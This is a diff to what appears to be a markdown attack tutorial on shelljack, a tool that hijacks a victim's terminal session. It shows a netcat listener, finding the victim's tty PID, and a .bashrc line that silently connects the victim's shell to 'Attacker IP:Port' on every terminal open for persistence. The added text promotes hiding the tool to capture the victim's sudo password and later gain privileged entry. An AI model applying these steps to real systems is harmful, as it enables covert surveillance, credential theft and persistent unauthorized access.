@@ -41,7 +41,7 @@ nc -lvp Port
 
 With this command we are setting up a listener with -l, putting the command in verbose with -v and with -p we are setting up the port.
 
-Now in the victim's machine we have to know the PID (proccess ID) of the tty because shelljack needs it and then execute shelljack:
+Now on the victim's machine we need to know the PID (proccess ID) of the tty so that shelljack knows what to send us, in this case the shell, and thus be able to monitor everything that is written and executed on it:
 
 ```bash
 tty
@@ -71,3 +71,5 @@ tty &>/dev/null; /home/code/shelljack/shelljack -n Attacker IP:Port $$ &>/dev/nu
 ```
 
 What is inside .bashrc will be executed every time the user opens a terminal, so if we put the command to connect with shelljack, we will get persistence.
+
+This is very useful when it comes to maintaining persistence because if we hide the shelljack well on the victim machine, we can wait for them to enter the sudo password, or edit a file or anything like that to get information or enter later with privileges.
